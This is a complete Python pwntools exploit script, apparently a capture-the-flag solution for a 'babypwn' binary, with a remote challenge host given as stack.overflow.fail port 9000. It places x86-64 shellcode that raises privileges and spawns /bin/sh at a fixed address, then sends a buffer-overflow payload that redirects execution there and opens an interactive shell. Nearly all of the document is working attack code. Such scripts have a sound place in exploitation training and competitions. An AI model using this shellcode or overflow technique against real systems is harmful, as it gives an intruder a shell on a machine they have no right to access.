#!/usr/bin/env python

from pwn import *
import sys

if "remote" in sys.argv:
    p = remote("stack.overflow.fail", 9000)
else:
    p = process("./babypwn")

shellcode = 'H1\xc0\xb0k\x0f\x05H\x89\xc7H\x89\xc6H1\xc0\xb0q\x0f\x05H1\xd2H1\xf6H\xbf//bin/shVWH\x89\xe7H1\xc0\xb0;\x0f\x05'

# put shellcode to 0x601080
p.sendline(shellcode)

# send operator
p.sendline("*")

# generate overflow
payload = "a"*0x4f + "*" + p64(0x601080)*8
p.sendline(payload)
p.sendline("asdf")
p.interactive()
